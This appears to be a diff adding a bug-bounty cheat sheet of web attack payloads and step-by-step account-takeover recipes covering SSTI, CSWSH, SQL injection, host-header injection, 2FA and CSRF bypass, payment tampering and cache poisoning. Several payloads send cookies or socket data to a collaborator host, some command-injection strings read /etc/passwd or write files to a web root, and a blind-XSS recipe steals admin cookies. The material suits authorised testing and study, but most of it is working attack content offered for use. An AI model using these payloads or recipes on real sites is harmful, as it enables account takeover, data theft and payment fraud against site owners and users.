+        ![xsl.webp](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/da90a812-ccb7-45a0-acb3-22266dfdc02a/xsl.webp)
+        
+    - SSTI  ⇒ places ( inputs ) , params
+        
+        ```json
+        inject Angular js
+        for static pages with site.com/dir/#param=x
+        #param=constructor.constructor('$.get(\'//burpcollab.net/log.php\'+document.cookie)')()
+        "><u>test{{7*7}} in every input
+        query=${1’*1’}  ⇒ if 49 or 7777777  in source code 
+        query={{7*7}}
+        1: https://acme.com/errorpage{{2*3}}
+        2- https://acme.com/errorpage{{''.__class__.__mro__[2].__subclasses__
+        ()[40]('/etc/passwd').read() }}
+        3- tplmap -u "https://examxple.com/file?id=1"
+        
+        ```
+        
+        - 
+- **Web Sockets**
+    
+    ```json
+    try xss in socket message  <img src=1 onerror='alert(1)'>
+    ----------- try CSWSH -----------------
+    <script> 
+        var ws = new WebSocket('wss://paste the handshake url herefor ex: wss://example.com/chat'); 
+        ws.onopen = function() { 
+            ws.send("READY"); 
+        }; 
+    
+        ws.onmessage = function(event) { 
+            fetch('https://burp collaborator link, {method: 'POST', mode: 'no-cors', body: event.data}); 
+        }; 
+    </script>
+    ```
+    
+- **Create account**
+    - Registration
+        - if no account verification try to register with site admin@site.com ⇒ to access unauthorized places
+        - If no verification  signup and enable 2fa (bug) or 0-auth
+        - activation link does not expire
+        - dos attack with password no length limit ⇒ ( important )
+        
+        ```jsx
+        test+${{9*9}}@gmail.com => would be test+81@gmail.com
+        {"username": "`cat /etc/passwd`", "password": "test"}
+        {"username": "`touch /var/www/html/hack.html`", "password": "test"}
+        username='"><u>hossamshady
+        first name="><h1>hossam</h1> => see email inbox after registeration
+        "><svg/onload=confirm(document.cookie)>"@x.y
+        hossam@gmail.com'\"><svg/onload=confirm(1)>
+        <!--#printenv -->     ((SSI)) 
+        {{9*9}} or %{7*7} or #{7*7} or ${7*7}
+        email@gmil.com'(select*from(select(sleep(40)))a)+'
+        <!--#echo var="DATE_LOCAL" -->
+        ">\<img src=[https://www.no-gods-no-masters.com/images\_designs/anonymous-gandhi-d001001207265.png](https://www.no-gods-no-masters.com/images_designs/anonymous-gandhi-d001001207265.png)\>”@x.y "  
+        
+        Pre-Account takeover 
+        1- attacker makes account with victim@gmail.com
+        2- victim register new account with 0-auth 
+        3-Verification bypass now attacker can login the victim account without verification link with the password he entered while registering.
+        ------------------------------------
+        ##Account takeover via 0-auth facebook
+        1- register with facebook account
+        2- don't give the site access to facebook email address
+        3- observe email field would be empty intercept the request and
+         put victim email address and you entered his profile
+        ------------------------------------
+        account takeover 
+        1- login with your account victim@gmail.com in chrome 
+        2- signup with the same email and observe email is already exists 
+         - response manupliate ( 302 email registered ) and change any thing observe data in chrome changed
+         - or try to access /account or /profile directly after step 2
+        
+        -------------------------------------
+        1- create two accounts with the same username  
+        reset the password it would be for the two but with different usernames
+        
+        -------------------------------------
+        if there is invitation for registeration try to race condtion to create 
+        more than one account with the same invitation 
+        
+        -------------------------------------
+        1- create account and don't click on verification link 
+        2- go to account and change the email address to new one and observe the first one verified
+        
+        -------------------------------------
+        1- make account with attacker@gmail.com and don’t press on verfiication link
+        2- change the email to victim@gmail.com and 
+        3- ask for verification link but don’t press on the second link
+        4- press on the first link (attacker) , if the victim verified ( bug )  
+        
+        -------------------------------------
+        account takeover with mobile app 
+        1- create account with email id on website and password
+        2- upload private image 
+        3- create account with same email id on mobile app and different password 
+        4- boom moblie app account can see web account private data
+        
+        -------------------------------------
+        1- login with facebook auth
+        2- click `edit access`
+        3- uncheck email address checkbox 
+        4- this will confuse the target app as no email has been shared from facebook and it will create unusual login flows
+        (https://www.notion.so/Images-f9339098aa70465a83a7d7b828af6842?pvs=4#2c33203e57d9406a9b6a6d5550b4042c)
+        
+        -------------------------------------
+        1- register with victim@gmail.com
+        2- login without confirmation with limited access
+        3- change email address to hacker@gmail.com 
+        4- change email address back to victim@gmail.com and observe (verified)
+        -------------------------------------
+        1- there is account called username victim
+        2- attacker make account with username ⓥⓘⒸⓣⓘⓂ
+        3- attacker reset the password and found that password changed to victim and ⓥⓘⒸⓣⓘⓂ accounts 
+        --------------------------------------
+        Delete account for permenant without password confirmation ([link](https://www.linkedin.com/posts/tarun-tandon14_bugbountytraining-bugbounty-ethicalhacking-activity-7168109672787308544-JQ2z?utm_source=share&utm_medium=member_desktop))
+        --------------------------------------
+        bypass username with victim\n  and you can request money from 3th man as victim
+        
+        ```
+        
+        ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/7abfd42b-1bb9-4dfb-8537-5254ea89599f/Untitled.png)
+        
+        - if username is in url then try to change username to ⇒ index.php , signup , singup.php , signin.php, login.php
+        - 
+        
+        ![1713878203073.jpeg](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/2e32c70f-9031-4622-9fc4-219cbd082c02/1713878203073.jpeg)
+        
+    - login
+        - Over http not https (intercept request)
+        - Change the request method to post and try to add data for registeration and change the content-type to application/json or application/x-www-form-urlencoded
+        - User login page doesn't implement any form of rate limiting ==> brute force password of login page ==> https://hackerone.com/reports/410451
+        - test sql injection
+            
+            ```json
+            put in username =>  ';WAITFOR DELAY '0:0:30'-- 
+            and see if waits 30 seconds
+            ```
+            
+            [sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2](https://www.notion.so/sqlmap-u-https-my-easyname-at-en-login-dbs-forms-crawl-2-27fc98ab5d2b4320a6e43a7086bdbafd?pvs=21)
+            
+            - test sqlinjection with sqlmap -r req.txt
+            - If password in json use intruder and sql injection wordlist from intruder .
+        - if prompt login /admin/index.php ⇒ go back to /admin and see if authorized
+        - if prompt login change the request method to post
+        - if promplt login ⇒ use chrome , can bypass it
+        - if there is [email=test@gmail.com](mailto:email=test@gmail.com)%27\%22%3E%3Csvg/onload=alert(/xss/)%3E or "[email":"test@gmail.com](mailto:email%22:%22test@gmail.com)%27\%22%3E%3Csvg/onload=alert(/xss/)%3E"
+        - login with default credentials , admin:admin , admin:password , root:toor , admin:root, admin:123
+        - Response manulpation
+        
+        ```jsx
+        {"email":"oneaccount@gmail.com",
+        "password":["firstpass","secondpass","thirdpass"]
+        }
+        ```
+        
+        ```jsx
+        in admin panel  '+(select*from(select(sleep(10)))a)+'
+        ```
+        
+    - Updating
+        - check csrf in every update field
+        - put in username {{ '7'*7 }} and first name and last name ([report](https://hackerone.com/reports/125980))
+        
+        ```json
+        {"email":"\"test(a)\"@gmail.com"} => if 200 then try 
+        {"email":"tes't@gmail.com"} => if 500 then sql injection
+        {"email":"test'or'1'='1@gmail.com"} ==> must be 200 
+        {"email":"\"a'-IF(LENGTH(database())>9,SLEEP(7),0)or'1'='1\"@gmail.com"} => must delay 7 seconds
+        {"email":"\"a'-IF(LENGTH(database())=10,SLEEP(15),0)or'1'='1\"@gmail.com"} => must delay 15 seconds
+        {"email":"\"a'-IF(LENGTH(database())=11,SLEEP(15),0)or'1'='1\"@gmail.com"} => must delay 15 seconds
+        --------------------------------------------------
+        
+        idor while chaging the email address 
+        1- try to update your email address
+        2- capture the request and change the current email address with victim email 
+        3- update the email and boom , you updated the victim account
+        ---------------------------------------------------
+        updating email for the man who clicks on verification link 
+        1- try to update your email address 
+        2- take verification link and then send it to victim to click on it
+        3- if clicked on it then his email will change 
+        ----------------------------------------------------
+        merge the two tricks above (IDOR and verification link) 
+        1- update your email 
+        2- capture the request and change the current email to victim@gmail.com
+        3- get the verification code and then send it to victim@gmail.om
+        4- once clicked then account takeover
+        
+        ```
+        
+    - reset password
+        
+        ```powershell
+        {"code":{"$gt":0}} 
+        ```
+        
+        ```json
+        check link of reset password in email if http not https
+        ```
+        
+        ```json
+        send reset password ⇒ copy token and search in burp history 
+        ```
+        
+        ```json
+        check reset request code can be leaked in request or response
+        ```
+        
+        ```json
+        no rate limit (Email bombing)
+        ```
+        
+        ```json
+        ask reset password (from out) don’t press on it ⇒ 
+        login to account ⇒ change the email and verify ⇒ click on reset link
+         ⇒ if password changed through reset password link (bug)
+         
+         ------------------------------------------------
+        ask reset password (from out) don’t press on it ⇒
+        login to account ⇒ change the password ⇒
+        click on reset link ⇒ if password changed through reset password link (bug)
+        --------------------------------------------------
+        
+        1- reset the password or ask for reset code  
+        2- don't click or reload the page but go to /profile or /account
+         directly and see if you can access
+        
+        ```
+        
+        ```json
+        brute force otp 
+        ```
+        
+        ```json
+        1-> xss via reset ⇒  [https://app.recordedfuture.com/live/login/?reset=x&username=xss"><img+src=x+onerror=alert(document.domain)>](https://app.recordedfuture.com/live/login/?reset=x&username=xss%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E)
+        ```
+        
+        ```json
+        reset password does not end live sessions 
+        ```
+        
+        ```json
+        take request and try sql injection ⇒ *sqlmap -r req.txt* 
+        ```
+        
+        ```json
+        Use username@burp_collab.net and analyze the callback
+        ```
+        
+        ```json
+        use arjun to detect params ⇒ arjun -u https://example.com -m post 
+        ```
+        
+        ```json
+        fuzz parameters by large wordlist of arjun  [look here](https://infosecwriteups.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5)  
+        ```
+        
+        ```json
+        check password policy while resetting new password
+        ```
+        
+        ```json
+        check if token is Guuid v1 to make sandwich attack 
+        ```
+        
+        - IF found /api/user/resetpassword change it to
+            
+            ```jsx
+             /api/root/resetpassword 
+             /api/su/resetpassword 
+             /api/admin/resetpassword
+             /api/administrator/resetpassword
+            ```
+            
+        - reset link can be used multiple times
+            
+            ```json
+            If target allows you to reuse the reset link then hunt for more reset link via gau, wayback or urlscan.io
+            ```
+            
+        - reset link exposed via referrer (Cross-Domain Referer Leakage)
+            
+            https://hackerone.com/reports/1320242 
+            
+            - click on reset password url and and don’t put new password but click on icon of facebook or twitter down and intercept the request if refererer if reset password link then it’s bug Password reset token leak on third party website via Referer header
+                
+                [poc_rQr2gtc6.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/e354a084-7712-4c9f-90a1-83c4198e9c66/poc_rQr2gtc6.mp4)
+                
+        
+        ```json
+        check if there is exposed information in response about victim while resetting password
+        ```
+        
+        ```json
+        manulplate response to disclosure email address of victim by his phone or reverse
+        
+        ```
+        
+        - Host injection
+            - Host header injection
+                
+                ```json
+                ##0 
+                Host: attacker.com:'<a href="//burpcollab.net/?
+                open the link sent to your inbox and check burpcollab if there 
+                is interaction then vulnerable (Dangling Markup)
+                
+                ##1 can use double Host
+                Host: target.com
+                Host: attacker.com
+                
+                ##2 
+                GET https://victim.com/ HTTP/1.1
+                Host: attacker.com
+                
+                ##3  add one space before the second
+                Host: target.com
+                 Host: attacker.com
+                
+                ##3
+                 Host: attacker.com
+                Host: victim.com
+                
+                ##3 for amazon3 
+                \x1dHost: evilbucket.com
+                Host: victim.com
+                
+                ##4
+                Host: hacker.com?.victim.com
+                
+                ##5
+                Host: example.com.hacker.com
+                
+                ##6 combination
+                Host: wwwexample.com
+                
+                ##7
+                Host: hacker.com/example.com
+                
+                ##8
+                Host: mydomain.com%25%32%33@www.example.com
+                
+                ##9
+                Host: mydomain.com%23@www.example.com
+                
+                ##10
+                Host: my-victim.com
+                
+                ##11
+                remove Host and put X-Forwarded-Host: hacker.com
+                
+                ##12
+                Host: account.vicitm.com => replace with
+                Host: hacker.com => failed
+                Host: account.hacker.com => success
+                ```
+                
+            - Origin injection
+                
+                ```json
+                
+                Origin: hacker.com
+                Origin: https://burpcollab.com
+                Origin: hacker.com?.victim.com
+                Origin: example.com.hacker.com
+                Origin: wwwexample.com
+                Origin: hacker.com/example.com
+                Origin: mydomain.com%25%32%33@www.example.com
+                Origin: mydomain.com%23@www.example.com
+                ```
+                
+            
+            ```json
+            X-Forwarded-Host: https://burpcollab.com 
+            X-Forwarded-For: https://burpcollab.com
+            Referrer: https://burpcollab.com/ 
+            X-HTTP-Host-Override
+            Forwarded
+            X-Host
+            X-Forwarded-Server
+             0x7f000001  => hex for 127.0.0.1
+             
+                Decimal encoding: 2130706433
+                Hex encoding: 0x7f000001
+                Octal encoding: 0177.0000.0000.0001
+                Zero: 0
+                Short form: 127.1
+                IPv6: ::1
+                IPv4 address in IPv6 format: [0:0:0:0:0:ffff:127.0.0.1] or [::ffff:127.0.0.1]
+                External domain that resolves to localhost: localtest.me
+            
+            ```
+            
+        - reset password contain email address in request (idor)
+            
+            ```json
+            after clicking on link and put new password if found the email address
+            on request then change it to victim email address
+            https://hackerone.com/reports/315879
+            -------------------------------
+            another idor 
+            1- reset password for victim
+            2- reset password for you 
+            3- click on link and reset password found parameter "email"
+            4- change it to victim email and changed 
+            
+            ```
+            
+        - check headers Contain identifier
+            
+            ```json
+             uuid: [attacker@gmail.com](mailto:attacker@gmail.com) or uuid of attacker then change it to victim 
+             uuid or email (uuid can be found in reset password functionality )
+            ```
+            
+        - change your cookies to victim cookies while resetting password
+            
+            ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/717695fb-482c-4af8-a7e9-2bf2ac3a285c/Untitled.png)
+            
+        - victim@gmail.com and yyyyyyyyyyyyyyyyvictim@gmail.com and check tokens (similar)
+        
+        ```json
+        {"email":"victim@mail.com","email":"attacker@mail.com"}
+        {"email":"attacker@mail.com\nvictim@mail.com"}
+        {"email":"accA@mail.com\naccB@mail.com"}
+        {"email":"Victim@mail.com,attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com,Attacker@mail.com"}
+        {"email":"Victim@mail.com;Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com;Attacker@mail.com"}
+        {"email":"Victim@mail.com%20Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com%20Attacker@mail.com"}
+        {"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
+        {"email":"Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
+        {"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
+        {"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
+        {"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
+        {"email":["victim@mail.com","attacker@mail.com"]}
+        
+        ----------------------------
+        email=victim@xyz.com&email=hacker@xyz.com
+        email=victim@xyz.com%0a%0dcc:hacker@xyz.com
+        email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
+        email=victim@email.com%20email=attacker@email.com
+        email=victim@xyz.com,hacker@xyz.com
+        email="victim@xyz.com",email="hacker@xyz.com"
+        email=victim@xyz.com/ehacker@xyz.com
+        email=victim@xyz.com|hacker@xyz.com
+        email=victim => no domain
+        email=victim@xyz => no tld
+        email=victim@gmail.com&code=123456 or put token 
+        user[email][]=vicitm@gmail.com&user[email][]=hacker@gmail.com
+        ```
+        
+    - 2FA Bypass
+        
+        ```powershell
+        1- if the website requires 2FA to login then try to login with password and no 2fa
+        2- try to enter all the authenticated paths and if one of them entered without 2fa 
+        then vulenrablility as : /profile /change_password /disable_2fa 
+        ```
+        
+        - check request and response ⇒ code leak
+        - No rate limit on 2FA  ( resend the code reset the rate limit)
+            - disable 2fa and reconfigure it and if QR code not changed then 2FA secret cannot be rotated
+        - bypass 2fa via oauth login
+        - bypass rate limit by **race conditioning**
+        - No rate limit inside account 2FA
+        - information disclosure via 2FA page (mobile number , names …)
+        - No rate limit on sending code to sms (waste company money)
+        - response manipulation  403 Forbidden ⇒ 200 OK   ; success:false ⇒ success:true
+        - code: true  ,  code: 1 , code: 123456 , code: 000000 , code: null , code: 111111 {”otp”:true}
+        - 2fa can be used multiple times (used code)
+        - Click-jacking to disable 2fa ⇒ **x-frame-options**
+        - reset password ⇒ 2fa disabled ⇒ found that entering account directly
+        - change email ⇒ 2fa disabled ⇒ vulnerability
+        - QR code Secret can’t be rotated **normal QR rotate after 30 seconds**
+        - use another valid 2fa code (Unused Code)
+        - check request and change the phone number (if found ) to your phone number
+            
+            https://medium.com/@katmaca2014/account-takeover-via-business-logic-40b45bfa11c4
+            
+        - csrf to disable 2fa (put null payload in token and click two times to override )
+        - enable 2fa without email verification
+        - enabling 2fa does not end another live  sessions
+        - bypass by /account  (next endpoint)
+            
+            login with username and password and when ask for 2fa put /account in the url without reloading 
+            
+        - create account with non-existing phone number
+            - intercept the request and send to repeater
+            - forward the request with non-exist phone number
+            - put real true number in repeater and send
+            - if code reached you put it and you can verify non-exist number with the code reached you
+            
+        - Try to perform different authenticated requests (profile details change, even password / 2FA settings change etc) without solving the 2fa.
+        - check issue if sign in with google disables 2fa ⇒ https://hackerone.com/reports/178293
+        
+        ```json
+        ##0
+        1- Browser A: The attacker opens the login page and enters credentials for an account without 2FA
+        2- Browser B: The attacker opens the login page and enters credentials for the victim who has 2FA enabled. Consequently, they are redirected to /login/key/random_key
+        3- Browser B: The attacker substitutes the session ID with Browser A's session ID and refreshes the page
+        4- Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled
+        
+        ##1
+        1- attacker enable 2fa on his account and login and wait in 2fa page 
+        2- in another broswer attacker opens victim account with password and wait in 2fa page 
+        3- attacker takes cookies from victim page and put it in step 1 and put attacker code (boom)
+        -----------------------
+        ##2
+        1- Directly Navigate to the page which comes after 2FA or any other authenticated  
+        page of the application.
+        2- If there is no success, change the refer header to the 2FA page URL. This may fool  
+        application to pretend as if the request came after satisfying 2FA Condition
+        -----------------------
+        ##3
+        1- If the "remember me" functionality is attached to your IP address, you can try to figure out the IP address of the victim and impersonate it using the **X-Forwarded-For** header.
+        2- If the "remember me" functionality uses a new cookie with a guessable code, try to guess it.
+        -----------------------
+        ##4
+        1- There is a rate limit but when you "resend the code" the same code is sent and the rate limit is reset. Then, you can brute force the code while you resend it so the rate limit is never reached.
+        -----------------------
+        ##5 
+        No rate limit over Backup codes 
+        
+        ```
+        
+    - Broken authentication
+        
+        ***use autorize or exchange two accounts Authorization header and test***
+        
+        - Broken authentication session management
+            
+            ```jsx
+            login to your account and update anything 
+            intercept the request and send it to repeater 
+            drop request and logout from your account
+            back to repeater and send request 
+            login to your account and see if updated (bug)
+            ```
+            
+        - OTP sent to existing email not new one
+            
+            ```jsx
+            update email address and verify otp is sent to existing email address not new one (Critical)
+            ```
+            
+        - Updating email address does not end another sessions
+        - login and navigate pages
+            
+            ```jsx
+            logout
+            press (Alt+left-arrow) buttons
+            if saw data then lack of cache poisoning headers
+            ```
+            
+        - Bypass any function requires password
+            
+            search for any function inside account require password and make response manipulation with wrong password
+            
+            [Authentication Bypass via Response manipulation Vulnerability Live Website #Bugbounty #POC 2022(1).mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/9fd32d2b-9298-4e2f-9cc4-5559b47f8dea/Authentication_Bypass_via_Response_manipulation_Vulnerability_Live_Website_Bugbounty_POC_2022(1).mp4)
+            
+        - create account with email A not verified
+            
+            ```jsx
+            change the email address to email B
+            send verification and verify email B
+            change the email back again to email A
+            if shown that email A is verifed then ( bug )
+            ```
+            
+        - Bypass email verfication lead to privilage escalation
+            
+            ```jsx
+            create account with hacker@gmail.com
+            before verfication change email to victim@gmail.com
+            click on verifcation link reached to hacker@gmail.com and see if victim@gmail.com verified or not 
+            ```
+            
+        - change password for other users by id
+            
+            change password {”fname”:”hossam”,”id”:11,”pass”:”12345”} change id,username 
+            
+        - use => { "root":{"username","hossam","pass":"ali"} }	==> will show root user info
+        - privilage esclation
+            
+            if option to make team and make admins save request in repeater with admin and downgrade yourself as user and  send request in repeater to see ..
+            
+        - if there is is_Admin: false ⇒ is_Admin: true
+        - no rate limit on old password when updating it in account
+        - no rate limit on contact us or help page
+        - Invite
+            
+            ```jsx
+            Create account a (admin) invites B and give permission (admin) 
+            B go to do any admin action and save it in repeater 
+            A downgrade B to user 
+            B go to repeater and perform action and bypassed as admi
+            ```
+            
+        - bypass admin panel
+            
+            ```json
+            # Accessing Admin Page via Blind XSS $1000 🦊
+            
+            1. Create an account and log in.
+            2. Navigate to the chat feature where users ask for information about properties.
+            3. Insert an XSSHunter payload in the chat message input field.
+            4. Wait for an email notification from XSSHunter, confirming the payload has been executed on admin zone.
+            5. Open the admin login page and replace the website’s cookies with the ones provided in the XSSHunter email.
+            6. Refresh the page and gain access to the admin page.
+            ```
+            
+        
+        ```json
+        GET /delete?user=test HTTP/1.1
+        Response
+        HTTP/1.1 401 Unauthorized
+        
+        GET /delete?user=test HTTP/1.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        Response
+        HTTP/1.1 302 Found
+        --------------------------------------
+        inurl:"target name" employee offers => get offers for employees
+        ---------------------------------------
+        Broken authentication in 2fa
+        1- register user1 and user2 and put one phone number for both 
+        2- verify the accounts with the same phone number
+        2- logout from 2 accounts and try to login to each of them , (login failed)
+        ---------------------------------------
+        
+        ```
+        
+    - Rate limit
+        
+        ```json
+        Using Similar Endpoints: ``` /sign-up --> /Sign-up
+        Blank char in params: ``` code=1234%0a
+        Add extra params: ``` /resetpwd?someparam=1
+        Remove all headers including Host , make http > 1.0
+        no rate limit reporting on comments which make it delelted
+        no rate limit fuzzing coupon 
+        no rate limit on otp of SSO 
+        no rate limit on comments 
+        no Rate limit on ssh 22 
+        ```
+        
+        - use headers as
+            
+            ```json
+            
+            x-forwarded-host:<host>
+            - X-Originating-IP:<ip>
+            - X-Real-IP: <ip>
+            - X-Custom-IP-Authorization:<ip>
+            - X-Remote-IP:<ip>
+            - X-Remote-Addr: <ip>
+            - X-Client-IP: <ip>
+            X-Origination-IP: 127.0.0.1 or 0.0.0.0
+            X-Fowarded-For: 127.0.0.1
+            X-Remote-IP: 127.0.0.1
+            X-Remote-Addr: 127.0.0.1
+            
+            X-Forwarded-For: 127.0.0.1 ⇒ 2 times
+            ```
+            
+            - if one of them ok for 2 times for example use burp intruder and change ip with Pitchfork https://medium.com/@0xs4s4/2fa-bypass-via-bypassing-the-ratelimit-5f5a36774830
+            - if your ip got blocked bypass rate limit with ip rotate
+            
+    - payment bypass
+        
+        ```json
+        id=1&quantity=1 ⇒ price 451$
+        id=1&quantity=.1 => price 45.1
+        quantity=-2 
+        
+        (1,alert)(7*7)]   ⇒ in  discount filed if reflected price of percentage(resource injection) 
+        --------------------------------------------------
+        1- try to choose paypal or coinpayments and intercept requests
+        2- found parameters "Sucess or Referrer or  Callback"
+        3- if link found in any parameter as example.com/payments/MD5HASH
+        4- copy example.com/payments/MD5HASH and open it in new tap and observe your payment has been succeeded
+        ----------------------------------------------------
+        1- add 5 apples to cart = 100$
+        2- add 2 bananas to card 20$ but change amount to -2   
+        3- observe total price for 5 apples would be 80$   ([report](https://hackerone.com/reports/364843))
+        -----------------------------------------------------
+        1- could gain points buying something and make cash on delivery then cancel
+        -----------------------------------------------------
+        1- buy something and put payment_method_id as non exisiting one (buy something free) 
+        -----------------------------------------------------
+        1- see that if you can't make action see if you can do it with api 
+        -----------------------------------------------------
+        1- try to add user to /users/api/v1/users  => check PUT or POST 
+        2- try to upload file to /wp-content/uploads
+        -----------------------------------------------------
+        if {"code":"USD","Price":"10.99"} then try
+          {"code":"INR","Price":"10.99"}
+           {"code":"USD","Price":"1.99"}
+            {"code":"USD","Price":"0.99"}
+             {"code":"USD","Price":"99.10"}
+        
+         
+        
+        ```
+        
+    - CSRF
+        - csrf to change username , password, email , name , upload image , make posts , delete account , turn on ,off function
+        - https://infosecwriteups.com/csrf-bypass-using-domain-confusion-leads-to-ato-ac682dd17722
+        - Found csrf token
+            
+            0- test if csrf token is for different accounts  
+            
+            1- put 0 or null or leave token= 
+            
+            change encoding JSON ⇒ urlencoded ⇒ multiple form 
+            
+            1- change method from post to get and remove the token ,remove token param
+            
+            2- use another unused live token of another account
+            
+            - 3-  Found reflected  csrf in Cookies
+                
+                ```jsx
+                <img src="[site.com/?parameterWhichIsRelfectingHeader=hossamshady
+                Set-Cookie:](http://site.com/?parameterWhichIsRelfectingHeader=hossamshady%0D%0ASet-Cookie:) csrfKey=yourCsrfWhichIsNotUsed%3b SameSite=None" onerror="document.forms[0].submit()">
+                ```
+                
+            
+            4- IF found csrf token key and another one in cookies with the same value try to change them with new same value 
+            
+            5- remove current password value or current password parameter and value 
+            
+            6- change token with same length 
+            
+            7- Search for clickjacking to bypass csrf protection by click band burpsuite
+            
+            - 8- Bypass referer
+                - Delete Referer
+                - Referer: https://attacker.com/https://victim.com
+            
+            9- Put  ? _method=POST  in url request to change the request verb
+            
+            10- try bypass referrer by in HTML poc
+            
+            11- if commerce then csrf adding to pocket or increasing the quantity of item 
+            
+            ```jsx
+            <meta name="referrer" content="never">
+            <meta name="referrer" content="no-referrer" />
+            <meta name="referrer" content="unsafe-url" />
+            ```
+            
+            11- try to steal csrf token by xss or cors 
+            
+            12- try to send message or transfer money to your hacker account
+            
+        
+        ```jsx
+        <html>
+        <head>
+        <title>Badoo account take over</title>
+        <script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
+        </head>
+        <body>
+        <script>
+        function getCSRFcode(str) {
+            return str.split('=')[2];
+        }
+        window.onload = function(){
+        var csrf_code = getCSRFcode(url_stats);
+        csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
+        window.location = csrf_url;
+        };
+        </script>
+        ```
+        
+    - Html injection
+        - username , name , address , first name .. etc…
+            
+            ```jsx
+            '"><u>hossam
+            '"><u>HOSSAM SHADY WAS HERE${7'*7'}
+            in chats : <img src=x onerror=this.src='http://burp_collaborator/?c='+document.cookie>
+            ```
+            
+    - Lack of password confirmation
+        
+        There is no password in 
+        
+        2fa , change password , delete account , change email 
+        
+    - Lack of email verification
+        
+        During registration
+        
+        During updating email  
+        
+    - **Mail Bombing in the Contact Form**
+        
+        There is no limit for sending messages in contact us page 
+        
+    - Captcha bypass
+        - change request from get ⇒ post , post ⇒ put
+        - change post ⇒ get =⇒ leave value empty
+        - change post to put or patch ⇒ with the same captcha send request many times and observe are the same https://hackerone.com/reports/206653
+        - use headers as
+            
+            X-Origination-IP: 127.0.0.1
+            X-Fowarded-For: 127.0.0.1
+            X-Remote-IP: 127.0.0.1
+            X-Remote-Addr: 127.0.0.1
+            
+        - Remove value
+        - Remove parameter and value
+        - use previous value
+        - use live value of another account
+        - use any random value but same lenght of chars
+        - check captcha value in source code
+        - if found Google recaptcha api key then attacker can bypass the Google re-capcha functionality
+    - Cache poisioning
+        - cache identifing
+            
+            X-Cache , Cache-Control , Age, 
+            
+        - Param Miner to check for keys as can be reflected in js :-
+            
+            ```jsx
+             <script src=//x-forwarded-for-value>/assets/main.js>
+            ```
+            
+        - Reflected Cookies ⇒ Xss
+            
+            ```jsx
+            Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
+            ```
+            
+        - Reflected Headers
+            
+            ```json
+            X-Forwarded-Host: <script>confirm()</script>
+            ```
+            
+        - Open redirect lead to cache
+            - Understanding
+                
+                Servers can redirect users from http to https based on two things 
+                
+                1- X-Forwarded-Scheme: http ⇒ indicates that should redirect as it is http not https
+                
+                2- X-Forwarded-Host: [attacker.com](http://attacker.com)  ⇒ the place to redirect the user
+                
+            - Redirect users
+                
+                1- X-Forwarded-Host: hacker.com
+                
+                2- X-Forwarded-Scheme: nohttps
+                
+        - when to give up
+            
+            **When to Give up**
+            
+            - [ ]  Cache-Control: no-cache, must-revalidate
+            - [ ]  Cache-Control: no-cache, private
+            - [ ]  Cf-Cache-Status: DYNAMIC
+            - [ ]  If the target is Cloudflare and the XSS is in the following then cache poisoning is not possible because those values become part of the cache key if they differ from the origin server.:
+                - `x-forwarded-host`
+                - `x-host`
+                - `x-forwarded-scheme`
+                - `x-http-method-override`
+                - `x-http-method`
+                - `x-method-override`
+                - `x-original-url`
+                - `x-rewrite-url`
+                - `forwarded`
+        
+    - Cache Deception  ⇒ **Age: 40, X-Cache: miss**
+        - Understand
+            
+            if you requested static page (css,jpeg) and found the same content then can be cached 
+            
+        - [https://example.com/profile/](https://example.com/profile/noexist.css) (even 404 look at source code)
+            - https://example.com/profile.css
+            - https://example.com/profile/nonexist.css
+            
+            /endpoint%2F../api/user-info/get 
+            
+            will get the content of /api/user-info/get 
+            
+            - https://example.com/profile.jpeg
+            - https://example.com/profile/nonexist.jpeg
+            - in Aspx ⇒ https://example.com/profile.aspx/nonexist.css
+            - https://example.com/profile/file.avif or .js and even 404 then look at source code may email or id in them
+            - /v2/search/anything;.css
+            - /v2/me;anything.css?params
+            - **/**api/user%0a-anytext.css
+            - /api/invite/INVITE%0a-randomtext.css
+            
+            Check for cachable Apache path normalization `GET //blog`
+            
+            - [ ]  Check for cachable Nginx path normalization `GET /blog%3F`
+            - [ ]  Check for cachable PHP path normalization `GET /blog.php/xyz`
+            - [ ]  Check for cachable .NET path normalization `GET /blog(A(xyz))/`
